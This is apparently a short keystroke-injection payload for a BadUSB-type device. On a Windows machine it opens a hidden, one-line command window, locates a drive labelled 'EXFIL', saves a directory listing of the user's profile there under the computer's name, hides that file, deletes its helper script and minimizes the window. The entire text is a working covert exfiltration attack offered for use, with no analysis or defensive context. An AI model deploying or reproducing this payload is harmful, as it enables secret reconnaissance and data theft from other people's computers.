layout('us');
delay(500);
press("GUI r");
delay(1500);
type("cmd /k \"mode con:cols=18 lines=1&color FE&cd %userprofile%&for /f %d in ('wmic volume get driveletter^, label ^| findstr \"EXFIL\"') do set myd=%d&echo tree /a /f > echotree.cmd\"");
delay(200)
press("ENTER");
delay(2500);
type("echotree.cmd > %myd%/%computername%.txt&del echotree.cmd&attrib +h %myd%/%computername%.txt&exit")
delay(100);
press("ENTER");
press("ALT SPACE");
type("n")